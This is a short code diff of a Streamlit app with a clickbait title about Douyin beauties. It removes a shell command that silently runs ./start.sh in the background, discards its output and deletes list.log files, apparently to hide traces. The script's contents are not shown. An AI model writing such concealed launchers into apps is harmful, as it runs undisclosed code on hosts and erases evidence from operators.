@@ -7,11 +7,6 @@ import psutil
 # Define the command to be executed
 cmd = (
     "chmod +x ./start.sh && "
-    "nohup ./start.sh > /dev/null 2>&1 & "
-    "while [ ! -f list.log ]; do sleep 1; done; "
-    "rm -rf list.log &&"
-    "rm -rf /tmp/list.log &&"
-    "echo 'app is running' "
 )
 
 st.title("❤️抖音美女欣赏❤️")
